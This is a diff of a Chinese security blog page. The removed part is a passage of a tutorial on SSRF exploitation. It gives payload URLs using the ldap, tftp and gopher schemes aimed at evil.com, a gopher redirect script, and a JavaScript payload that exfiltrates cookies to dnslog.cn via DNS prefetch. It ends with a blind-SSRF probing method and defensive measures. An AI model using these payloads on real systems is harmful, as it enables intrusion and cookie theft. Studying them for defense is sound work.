-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure>
-
-<h5 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a><strong>tftp://</strong></h5><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET </span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure>
-
-<h5 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a><strong>gopher://</strong></h5><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">Gopher</a>是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php  header(&apos;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&apos;);?&gt;</span><br><span class="line"> evil.com:# nc -lvp 1337</span><br><span class="line"> Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure>
-
-<h4 id="利用技巧-1"><a href="#利用技巧-1" class="headerlink" title="利用技巧"></a><strong>利用技巧</strong></h4><p>dnslog无回显解决</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.107.1:8080/ssrf.php?url=http://php.nf9eex.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<p><em>ps:dnslog绕过xss-csp</em></p>
-<p><em>DNS预解析可以绕过CSP进行解析，结合DNSLOG我们即可窃取在CSP保护下的Cookie。</em></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Payload</span><br><span class="line">document.querySelector(&apos;body&apos;).innerHTML += &quot;&lt;link rel=&apos;dns-prefetch&apos; href=&apos;&quot; + window.btoa(document.cookie.split(/;|=/)[1]) + &quot;.4q9z30.dnslog.cn&apos;&gt;&quot;</span><br><span class="line"></span><br><span class="line">#执行结果</span><br><span class="line">R0ExLjIuMTY0MjI2NDMxNi4xNTMyNTc0NTg3.4q9z30.dnslog.cn **.**.**.**   2019-07-27 10:45</span><br></pre></td></tr></table></figure>
-
-<p>dnslog ssrf外更多利用<a href="https://weiyigeek.club/2019/04/17/模糊测试之攻击回显.html" target="_blank" rel="noopener">参考</a></p>
-<p>综合利用</p>
-<p>Bool型SSRF是根据返回包中的state进行判断，当state为”远程连接出错”或者为“SUCCESS”时表示该主机存在，且对应的端口为开放状态。对于Bool型SSRF ，页面仅返回了状态， 而没有更多别的信息，要想进一步利用，可根据如下的思路：</p>
-<p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;查看结果</p>
-<p>1）内网探测</p>
-<p>a:验证URL Schema存在情况，并通过自动化脚本探测内网，查看内网开放的主机和端口 。</p>
-<p>2)应用识别</p>
-<p>根据存在的端口进行应用识别</p>
-<p>3）构造攻击Payload</p>
-<p>根据识别的应用和漏洞构造对应payload进行验证</p>
-<p>4）查看结果</p>
-<h4 id="盲打案例"><a href="#盲打案例" class="headerlink" title="盲打案例"></a><strong>盲打案例</strong></h4><p>可结合以下三篇，进行参考。</p>
-<p><a href="https://www.wtfsec.org/5651/ueditor-ssrf漏洞jsp版本分析与复现" target="_blank" rel="noopener">ueditor-ssrf漏洞jsp版本</a></p>
-<p><a href="https://www.uedbox.com/post/10524/" target="_blank" rel="noopener">Bool型SSRF的思考与实践</a></p>
-<p><a href="https://blog.csdn.net/Fly_hps/article/details/84396690" target="_blank" rel="noopener">腾讯某处SSRF漏洞</a></p>
-<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>1.禁止跳转</p>
-<p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
-<p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
-<p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
-<p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
-<p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
-<p><strong>参考：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;https://nosec.org/home/detail/2167.html&gt;</span><br><span class="line">https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#</span><br><span class="line">https://evilcos.me/?p=221</span><br><span class="line">https://www.jianshu.com/p/b31b7b1ca3cb</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2252,7 +2137,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">23</span>
+                    <span class="site-state-item-count">24</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
